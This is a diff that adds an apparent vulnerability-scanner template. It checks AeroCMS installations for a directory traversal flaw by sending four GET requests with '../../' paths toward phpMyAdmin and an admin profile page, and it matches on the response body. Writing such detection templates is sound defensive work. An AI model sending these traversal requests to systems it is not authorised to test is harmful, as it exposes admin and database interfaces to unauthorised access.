@@ -1,0 +1,26 @@
+name: aerocms-directory-traversal
+rules:
+  r0:
+    request:
+      method: GET
+      path: /includes/../../phpMyAdmin/index.php
+    expression: response.status == 200 && response.body.bcontains(b'phpMyAdmin') 
+  r1:
+    request:
+      method: GET
+      path: /images/../../admin/profile.php
+    expression: response.status == 200 && response.body.bcontains(b'username') 
+  r2:
+    request:
+      method: GET
+      path: /js/../../admin/profile.php
+    expression: response.status == 200 && response.body.bcontains(b'username') 
+  r3:
+    request:
+      method: GET
+      path: /fonts/../../admin/profile.php
+    expression: response.status == 200 && response.body.bcontains(b'username') 
+expression: r0() || r1() || r2() || r3()
+detail:
+  links:
+    - https://github.com/MegaTKC/AeroCMS/issues/7
